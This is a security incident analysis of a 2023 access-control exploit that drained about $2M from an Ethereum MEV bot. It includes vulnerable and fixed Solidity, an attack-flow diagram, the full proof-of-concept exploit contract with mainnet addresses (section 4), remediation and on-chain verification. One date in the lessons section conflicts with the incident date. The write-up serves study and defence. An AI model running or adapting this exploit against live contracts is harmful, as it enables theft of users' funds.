# MEV Bot — Analysis of Fund Theft via Access Control Vulnerability

| Field | Details |
|------|------|
| **Date** | 2023-11-07 |
| **Protocol** | MEV Bot (0x05f016...) |
| **Chain** | Ethereum |
| **Loss** | ~$2,000,000 (approximately 1,047 WETH equivalent) |
| **Attacker** | [0x46d9...F5a2](https://etherscan.io/address/0x46d9b3dfbc163465ca9e306487cba60bc438f5a2) |
| **Attack Contract** | [0xeadf...8b1](https://etherscan.io/address/0xeadf72fd4733665854c76926f4473389ff1b78b1) |
| **Attack Tx** | [0xbc08...a38](https://etherscan.io/tx/0xbc08860cd0a08289c41033bdc84b2bb2b0c54a51ceae59620ed9904384287a38) |
| **Vulnerable Contract** | [0x05f0...4a5](https://etherscan.io/address/0x05f016765c6c601fd05a10dba1abe21a04f924a5) |
| **Root Cause** | Missing access control on public swap execution function (`0xf6ebebbb`) — unauthorized theft of tokens held by the bot |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/bot_exp.sol) |

---

## 1. Vulnerability Overview

This MEV bot (0x05f016...) is an automated contract that performs arbitrage on Curve Finance pools. The bot contained a function (selector `0xf6ebebbb`) that swaps designated tokens through Curve pools, however **this function had absolutely no caller authorization logic**.

The attacker exploited this by flash-borrowing 27,255 WETH (~$49M) from Aave V3, then repeatedly calling the vulnerable function to drain USDC ($610,000), USDT ($585,000), WBTC ($350,000), and WETH ($555,000) from the MEV bot — totaling approximately **$2.1M in assets**. The attacker converted the stolen assets to WETH via Curve pools, repaid the flash loan, and realized a net profit of approximately **1,047 WETH (~$1.88M)**.

The core vulnerability is straightforward: the MEV bot's swap function is declared `public` or `external` with no `msg.sender` or `owner` validation, allowing any arbitrary external caller to swap the bot's approved tokens to any destination.

---

## 2. Vulnerable Code Analysis

### 2.1 Public Swap Function — Missing Access Control (Core Vulnerability)

The function selector `0xf6ebebbb` called in the PoC is the MEV bot's swap execution function. The following vulnerable code is reconstructed based on interface analysis and on-chain behavior:

```solidity
// ❌ Vulnerable code — zero access control
// Anyone can call this function to swap the bot's entire balance to an arbitrary address
function swap(
    uint256 amount,         // Amount of tokens to swap (attacker sets to bot's full balance)
    uint256 minOut,         // Minimum output amount (attacker sets to 0 — unlimited slippage)
    address tokenIn,        // Input token address
    address tokenOut,       // Output token address
    address pool,           // Curve pool address (attacker-specified)
    uint256 i,              // Curve exchange index i
    uint256 j               // Curve exchange index j
) external {
    // ❌ No authorization check! Missing onlyOwner or onlyOperator modifier
    IERC20(tokenIn).approve(pool, amount);
    ICurve(pool).exchange(i, j, amount, minOut);
    // Exchanged tokenOut remains in this contract (MEV bot)
    // Attacker extracts accumulated tokenOut via a subsequent call to swap it again
}
```

```solidity
// ✅ Fixed code — owner authorization added
modifier onlyOwner() {
    require(msg.sender == owner, "Access denied: only owner can call");
    _;
}

// Or whitelist-based approach
modifier onlyAuthorized() {
    require(authorizedOperators[msg.sender], "Access denied: only authorized operators can call");
    _;
}

function swap(
    uint256 amount,
    uint256 minOut,
    address tokenIn,
    address tokenOut,
    address pool,
    uint256 i,
    uint256 j
) external onlyOwner {  // ✅ Access control modifier applied
    require(amount > 0, "Amount must be greater than 0");
    require(minOut > 0, "Slippage protection required"); // ✅ Slippage protection added
    IERC20(tokenIn).approve(pool, amount);
    ICurve(pool).exchange(i, j, amount, minOut);
}
```

**Problem**: The MEV bot either pre-approves tokens to Curve pools for normal operation, or performs approvals within the swap function itself. Without access control on the swap function, an attacker can pass the bot's entire balance as the `amount` argument and drain all tokens held by the bot through an attacker-controlled route.

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attack contract (0xeadf...) had been deployed in advance. The attacker EOA (0x46d9...) required no additional preparation beyond deploying the attack contract. The MEV bot had already accumulated the following balances through continuous arbitrage activity:

| Token | Bot Balance (Pre-Attack) | Estimated Value |
|------|----------------|----------|
| USDC | 610,000.00 USDC | $610,000 |
| USDT | 585,000.01 USDT | $585,000 |
| WBTC | 10.005553 WBTC | ~$350,194 |
| WETH | 308.6577 WETH | ~$555,584 |
| **Total** | | **~$2,100,778** |

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────────────┐
│  Attacker EOA (0x46d9...)                                               │
│  Calls attack contract: attack()                                        │
└───────────────────────────────┬─────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [Step 1] Aave V3 Flash Loan                                            │
│  aave.flashLoanSimple(attack_contract, WETH, 27,255 WETH, ...)          │
│  → Borrow 27,255 WETH (delivered to attack contract)                   │
└───────────────────────────────┬─────────────────────────────────────────┘
                                │ Enter executeOperation() callback
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [Step 2-A] MEV Bot Vulnerable Function Call #1: USDC → USDT           │
│  router.call(0xf6ebebbb,                                                │
│      amount=610,000 USDC (bot's full balance),                         │
│      minOut=0,                                                          │
│      tokenIn=USDC, tokenOut=USDT,                                       │
│      pool=Curve 3Pool (0xbEbc44...))                                    │
│  Result: Bot's 610,000 USDC → Curve 3Pool → Bot receives 609,647 USDT  │
└───────────────────────────────┬─────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [Step 2-B] MEV Bot Vulnerable Function Call #2: USDT (full) → WETH    │
│  router.call(0xf6ebebbb,                                                │
│      amount=1,194,647 USDT (bot's full USDT: original 585k + swapped   │
│      609k),                                                             │
│      minOut=0,                                                          │
│      tokenIn=USDT, tokenOut=WETH,                                       │
│      pool=Curve TriCrypto (0xD51a44...))                                │
│  Result: Bot's 1,194,647 USDT → Curve TriCrypto → Bot receives         │
│  603.53 WETH                                                            │
└───────────────────────────────┬─────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [Step 2-C] MEV Bot Vulnerable Function Call #3: WBTC → WETH           │
│  router.call(0xf6ebebbb,                                                │
│      amount=10.005553 WBTC (bot's full balance),                        │
│      minOut=0,                                                          │
│      tokenIn=WBTC, tokenOut=WETH,                                       │
│      pool=Curve TriCrypto (0xD51a44...))                                │
│  Result: Bot's 10 WBTC → Curve TriCrypto → Bot receives 176.97 WETH    │
└───────────────────────────────┬─────────────────────────────────────────┘
                                │ Bot's USDC/USDT/WBTC fully drained
                                │ Bot has accumulated original WETH + swapped WETH
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [Step 3] Attack Contract Direct Curve Swap: WETH → WBTC               │
│  Attack contract directly exchanges a portion of flash loan WETH to     │
│  WBTC via TriCrypto (intermediate step for profit maximization)         │
│  1,339.83 WETH → 6.948 WBTC                                             │
└───────────────────────────────┬─────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [Step 4] MEV Bot Vulnerable Function Call #4: Bot's WETH → WBTC       │
│  router.call(0xf6ebebbb,                                                │
│      amount=bot's full WETH (original 308.65 + 603.53 + 176.97 =       │
│      ~1,089 WETH)                                                       │
│      tokenIn=WETH, tokenOut=WBTC,                                       │
│      pool=Curve TriCrypto))                                             │
│  Result: Bot's WETH → WBTC, received by attack contract                │
└───────────────────────────────┬─────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [Step 5] WBTC → WETH Reverse Swap (attack contract directly)          │
│  Attack contract re-exchanges accumulated WBTC to WETH via TriCrypto   │
│  Consolidates all WETH drained from bot + profit into WETH             │
└───────────────────────────────┬─────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  [Step 6] Flash Loan Repayment + Profit Extraction                     │
│  Aave approval: weth.approve(aave, uint256.max)                        │
│  Repayment: 27,268.63 WETH (principal 27,255 + fee 13.63 WETH)        │
│  Net profit: ~1,047 WETH → transferred to attacker EOA (0x46d9...)     │
└─────────────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Value |
|------|-----|
| Flash Loan Amount | 27,255 WETH (~$49.06M) |
| Flash Loan Fee | 13.63 WETH (~$24,534) |
| MEV Bot Assets Drained | USDC $610k + USDT $585k + WBTC $350k + WETH $556k = ~$2.1M |
| Attacker Net Profit | **1,047.16 WETH (~$1,884,891)** |
| MEV Bot Loss | ~$2,100,778 (entire holdings wiped) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo
// Loss: ~$2M | Attack Tx: 0xbc08860c...
// Vulnerable Contract: 0x05f016765c6C601fd05a10dBa1AbE21a04F924A5

contract ContractTest is Test {
    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address router = 0x05f016765c6C601fd05a10dBa1AbE21a04F924A5; // ← Vulnerable MEV bot
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    ICurve firstCrvPool  = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7); // Curve 3Pool
    ICurve secondCrvPool = ICurve(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46); // Curve TriCrypto

    function testExploit() public {
        // [Step 1] Aave V3 flash loan request: 27,255 WETH
        aave.flashLoanSimple(address(this), address(weth), 27_255_000_000_000_000_000_000, new bytes(1), 0);
    }

    function executeOperation(...) external payable returns (bool) {
        // Approve Aave repayment (auto-collected at flash loan conclusion)
        weth.approve(address(aave), type(uint256).max);

        // Vulnerable function selector (MEV bot swap function with no access control)
        bytes4 vulnFunctionSignature = hex"f6ebebbb";

        // [Step 2-A] Swap bot's full USDC → Curve 3Pool → USDT
        // Key: regardless of msg.sender, anyone can swap the bot's tokens freely
        bytes memory data = abi.encodeWithSelector(
            vulnFunctionSignature,
            usdc.balanceOf(address(router)), // ← specify bot's full USDC balance
            0,                               // ← minOut=0: no slippage protection
            address(usdc),
            address(usdt),
            address(firstCrvPool),
            0, 0
        );
        (bool success,) = address(router).call(data);

        // [Step 2-B] Swap bot's full USDT → Curve TriCrypto → WETH
        data = abi.encodeWithSelector(
            vulnFunctionSignature,
            usdt.balanceOf(address(router)), // ← bot's full USDT balance (original + just swapped)
            0,
            address(usdt),
            address(weth),
            address(secondCrvPool),
            0, 0
        );
        (success,) = address(router).call(data);

        // [Step 2-C] Swap bot's full WBTC → Curve TriCrypto → WETH
        data = abi.encodeWithSelector(
            vulnFunctionSignature,
            wbtc.balanceOf(address(router)), // ← bot's full WBTC balance
            0,
            address(wbtc),
            address(weth),
            address(secondCrvPool),
            0, 0
        );
        (success,) = address(router).call(data);

        // [Step 3] Attack contract direct swap: WETH → WBTC (profit maximization)
        weth.approve(address(secondCrvPool), type(uint256).max);
        secondCrvPool.exchange(2, 1, weth.balanceOf(address(this)), 0);

        // [Step 4] Swap bot's full WETH → WBTC (received by attack contract)
        data = abi.encodeWithSelector(
            vulnFunctionSignature,
            weth.balanceOf(address(router)), // ← bot's full WETH balance
            0,
            address(weth),
            address(wbtc),
            address(secondCrvPool),
            0, 0
        );
        (success,) = address(router).call(data);

        // [Step 5] Reverse swap WBTC → WETH to fund flash loan repayment
        wbtc.approve(address(secondCrvPool), type(uint256).max);
        secondCrvPool.exchange(1, 2, wbtc.balanceOf(address(this)), 0);

        // [Step 6] Function returns → Aave collects 27,268.63 WETH from approved balance
        // Remaining WETH (~1,047) = attacker's net profit
        return true;
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Missing access control on public swap function | **CRITICAL** | CWE-284 | `03_access_control.md` — Pattern 1 |
| V-02 | No slippage protection (minOut=0 allowed) | HIGH | CWE-20 | `06_frontrunning.md` |
| V-03 | Unlimited token approve exposure | HIGH | CWE-285 | `03_access_control.md` |

### V-01: Missing Access Control on Public Swap Function

- **Description**: The MEV bot's swap execution function (`0xf6ebebbb`) is declared with `external` visibility and has no `msg.sender` validation, `onlyOwner` modifier, whitelist, or any other access control. Any arbitrary external address can exchange the bot's entire balance through any Curve pool into any token.
- **Impact**: Entire MEV bot holdings ($2.1M) can be drained immediately. Complete loss of funds in a single transaction.
- **Attack Conditions**: Identify the vulnerable function selector (via on-chain trace or bytecode analysis), query the bot's balance. No additional conditions — anyone can attack immediately.

### V-02: No Slippage Protection

- **Description**: Setting the `minOut` parameter to 0 in the vulnerable function causes exchanges at extremely unfavorable rates in Curve pools. The bot itself does not enforce a minimum value for minOut.
- **Impact**: Attacker can cause the bot's assets to be exchanged at worst-case rates without sandwiching.
- **Attack Conditions**: Prerequisite: V-01 vulnerability. Activated simply by passing `minOut=0` argument.

### V-03: Unlimited Token Approve Exposure

- **Description**: The bot contract either grants unlimited approvals to Curve pools, or within the swap function performs approvals to an arbitrary pool address specified by the attacker. This creates an additional attack vector through malicious pool contracts.
- **Impact**: A variant attack is possible where an attacker passes a contract implementing a malicious Curve interface as the `pool` argument to directly steal the bot's tokens.
- **Attack Conditions**: Prerequisite: V-01 vulnerability. Requires prior deployment of a malicious contract.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Immediate Action 1: Add onlyOwner modifier
contract MEVBot {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Access denied: only owner can call");
        _;
    }

    // Apply modifier to vulnerable function
    function swap(
        uint256 amount,
        uint256 minOut,
        address tokenIn,
        address tokenOut,
        address pool,
        uint256 i,
        uint256 j
    ) external onlyOwner {  // ✅ Access control added
        require(minOut > 0, "Slippage protection required");        // ✅ Enforce minOut minimum
        require(allowedPools[pool], "Pool not whitelisted");        // ✅ Pool address whitelist
        require(amount <= IERC20(tokenIn).balanceOf(address(this)), "Exceeds balance");
        IERC20(tokenIn).approve(pool, amount);
        ICurve(pool).exchange(i, j, amount, minOut);
    }
}
```

```solidity
// ✅ Immediate Action 2: Whitelist-based multi-operator approach
contract MEVBot {
    address public owner;
    mapping(address => bool) public authorizedOperators; // Authorized EOAs/contracts
    mapping(address => bool) public allowedPools;        // Whitelisted Curve pools
    mapping(address => bool) public allowedTokens;       // Whitelisted tokens

    modifier onlyAuthorized() {
        require(
            msg.sender == owner || authorizedOperators[msg.sender],
            "Access denied: only authorized operators can call"
        );
        _;
    }

    function swap(...) external onlyAuthorized {
        require(allowedPools[pool], "Curve pool not whitelisted");
        require(allowedTokens[tokenIn] && allowedTokens[tokenOut], "Token not whitelisted");
        require(minOut > 0, "Slippage protection required");
        // ...
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Missing access control | Apply `onlyOwner` or role-based access control (RBAC) to all fund-movement functions |
| V-02: Slippage protection | Enforce `minOut > 0` or auto-calculate minimum received amount based on on-chain TWAP |
| V-03: Arbitrary pool allowed | Maintain Curve pool address whitelist + fix as `immutable` at deployment |
| Bot design | Do not hold tokens directly in the bot contract — separate into a dedicated vault contract |
| Withdrawal path | Explicitly implement emergency withdrawal function (`emergencyWithdraw`) as owner-only |
| Monitoring | Deploy on-chain event monitoring system with immediate alerts for abnormal swaps |

---

## 7. Lessons Learned

1. **MEV bots must apply the same smart contract security principles**: The assumption that "it's a bot so nobody would call it externally" is fatal. Every `external`/`public` function of any contract deployed on-chain is a potential attack target.

2. **Review access control on all functions in contracts that hold funds**: In particular, functions that accept parameters like `amount`, `to`, and `token` from external callers must be recognized as structures where an attacker can specify the entire balance.

3. **Do not allow slippage parameters to be externally controlled**: When `minOut` is accepted as external input, the contract must either enforce a minimum value internally or auto-calculate it based on on-chain price feeds.

4. **Explicitly protect approved (approved) tokens**: When a contract approves tokens to an external protocol, always consider the possibility of unauthorized withdrawals through that pathway.

5. **Flash loans eliminate the capital barrier to attack**: Attackers can execute large-scale attacks without tens of millions of dollars in capital by using flash loans. When an access control vulnerability exists, combining it with a flash loan concentrates the entire damage into a single transaction.

6. **Code simplicity does not guarantee security**: This vulnerability's code logic was not complex. A single missing `require(msg.sender == owner)` led to $2M in losses.

7. **Similar incidents**: Other MEV bots (MEV_0x8c2d, MEV_0xa247) on the same date (2023-11-12) also suffered losses from the identical access control vulnerability. This indicates that this vulnerability was systematically overlooked within the MEV bot development community.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Setting | On-Chain Actual | Match |
|------|-----------|-------------|----------|
| Flash Loan (WETH) | 27,255 WETH | 27,255.0000 WETH | ✅ Exact match |
| USDC drained | `usdc.balanceOf(router)` | 610,000.00 USDC | ✅ Full drain confirmed |
| WBTC drained | `wbtc.balanceOf(router)` | 10.005553 WBTC | ✅ Full drain confirmed |
| Flash loan repayment | Principal + fee | 27,268.6275 WETH (fee 13.63 WETH) | ✅ Confirmed |
| Attacker net profit | ~$2M | **1,047.16 WETH (~$1,884,891)** | ✅ Approximate match |
| MEV bot loss | ~$2M | USDC $610k + USDT $585k + WBTC $350k + WETH $556k = **$2,100,778** | ✅ Match |

### 8.2 On-Chain Event Log Sequence

Event log order for attack transaction (block 18,523,344):

| Log Index | Event | Details |
|------------|--------|------|
| 0x00 | WETH Transfer | Aave → Attack contract: 27,255 WETH (flash loan disbursement) |
| 0x01 | USDC Transfer | MEV bot → Curve 3Pool: 610,000 USDC (drain Step 1) |
| 0x02 | USDT Transfer | Curve 3Pool → MEV bot: 609,647 USDT (exchange received) |
| 0x03 | TokenExchange | Curve 3Pool: USDC→USDT exchange event |
| 0x04 | USDT Transfer | MEV bot → Curve TriCrypto: 1,194,647 USDT (drain Step 2) |
| 0x05 | WETH Transfer | Curve TriCrypto → MEV bot: 603.53 WETH |
| 0x06 | TokenExchange | Curve TriCrypto: USDT→WETH exchange event |
| 0x07 | WBTC Transfer | MEV bot → Curve TriCrypto: 10.005 WBTC (drain Step 3) |
| 0x08 | WETH Transfer | Curve TriCrypto → MEV bot: 176.97 WETH |
| 0x09 | TokenExchange | Curve TriCrypto: WBTC→WETH exchange event |
| 0x0a | WETH Approval | Attack contract → Curve TriCrypto approve |
| 0x0b | WETH Transfer | Attack contract → Curve TriCrypto: 1,339.84 WETH |
| 0x0c | WBTC Transfer | Curve TriCrypto → Attack contract: 6.948 WBTC |
| 0x0d | TokenExchange | Curve TriCrypto: WETH→WBTC exchange event |
| 0x0e | WETH Deposit | MEV bot WETH deposit event |
| 0x0f | WETH Transfer | MEV bot → Curve TriCrypto: ~1,089 WETH (bot's full WETH drained) |
| 0x10 | WBTC Transfer | Curve TriCrypto → Attack contract: additional 6.948 WBTC |
| 0x11 | TokenExchange | Curve TriCrypto: WETH→WBTC exchange event |
| 0x12 | WBTC Approval | Attack contract → Curve TriCrypto WBTC approve |
| 0x13 | WBTC Transfer | Attack contract → Curve TriCrypto: full WBTC |
| 0x14 | WETH Transfer | Curve TriCrypto → Attack contract: net profit WETH consolidated |
| 0x15-0x18 | Additional exchanges | Additional WBTC/WETH exchange rounds |
| 0x19 | Aave FlashLoan | Flash loan event recorded |
| 0x1a | WETH Transfer | Attack contract → Attacker EOA: **1,047.16 WETH** (net profit transferred) |

### 8.3 Pre-Condition Verification (as of block 18,523,343)

| Item | State Immediately Before Attack | Verification Result |
|------|-------------|----------|
| MEV bot USDC balance | 610,000.001612 USDC | ✅ Precisely drained via PoC's `usdc.balanceOf(router)` call |
| MEV bot USDT balance | 585,000.009866 USDT | ✅ Aggregated with 609,647 USDT from first swap and drained |
| MEV bot WBTC balance | 10.005553 WBTC | ✅ Precisely drained via PoC's `wbtc.balanceOf(router)` call |
| MEV bot WETH balance | 308.6577 WETH | ✅ Drain confirmed via final swap |
| Vulnerable function access control | None | ✅ Confirmed callable by arbitrary callers |

**On-Chain Verification Result**: PoC analysis and on-chain actual data are in complete agreement. Confirmed that vulnerable function `0xf6ebebbb` is callable externally without access control, and the bot's entire balance was exhausted in a single transaction.

---

*Analysis date: 2026-04-11 | References: [BlockSecTeam Twitter](https://twitter.com/BlockSecTeam/status/1722101942061601052) | [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/bot_exp.sol)*